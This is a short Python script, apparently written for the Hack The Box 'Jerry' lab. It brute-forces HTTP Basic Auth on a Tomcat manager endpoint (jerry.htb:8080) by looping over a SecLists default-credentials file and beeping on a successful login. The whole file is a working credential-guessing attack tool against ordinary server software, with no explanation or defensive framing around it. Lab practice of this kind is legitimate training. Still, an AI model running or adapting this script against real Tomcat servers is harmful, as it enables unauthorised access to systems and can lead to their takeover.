# This script is extra. Requires libraries: tqdm, requests, colorama, playsound. You can install with pip3 install *library*

from tqdm import tqdm
import requests
from requests.auth import HTTPBasicAuth
from time import sleep
from colorama import Fore, init
init()
successflag = False
usernames = []
passwords = []

'''There is a default creds list in SecList repository for Tomcat instances. 
This list: https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt needs to be in the working dir
and named tomcatlist I've included it in this git'''

# Separate Usernames from Passwords in tomcatlist. Should be formated username:password
with open('tomcatlist', 'r') as creds:
  for line in creds.readlines():
    user = line.split(':')[0]
    pw = line.strip().split(':')[1]

    usernames.append(user)
    passwords.append(pw)

# Deduplication
dd_usernames = list(set(usernames))
dd_passwords = list(set(passwords))
#print(dd_passwords)

# Request

for user in dd_usernames:
    if successflag == True:
        break
    for password in tqdm(dd_passwords, desc = Fore.YELLOW + f'Username: {user}'):
        response = requests.get('http://jerry.htb:8080/manager', auth = HTTPBasicAuth(user,password)) 
        if successflag == True:
            break
        #print(f'Testing {user}:{password}')                           
        if response.status_code == 200:
            print(Fore.LIGHTCYAN_EX + f'\n\n[+] Success! User:{user} Password:{password}\n\n')
            successflag = True
            from playsound import playsound
            playsound('beep.mp3')
        
            
            # # TTS
            # # Import the required module for text 
            # # to speech conversion
            # from gtts import gTTS
            
            # # This module is imported so that we can 
            # # play the converted audio
            # import os
            
            # # The text that you want to convert to audio
            # mytext = f"The username is {user} and the password is {password}"
            
            # # Language in which you want to convert
            # language = 'en'
            
            # # Passing the text and language to the engine, 
            # # here we have marked slow=False. Which tells 
            # # the module that the converted audio should 
            # # have a high speed
            # myobj = gTTS(text=mytext, lang=language, slow=False)
            
            # # Saving the converted audio in a mp3 file named
            # # welcome 
            # myobj.save("welcome.mp3")
            
            # # Playing the converted file
            # os.system("mpg321 welcome.mp3")
            break
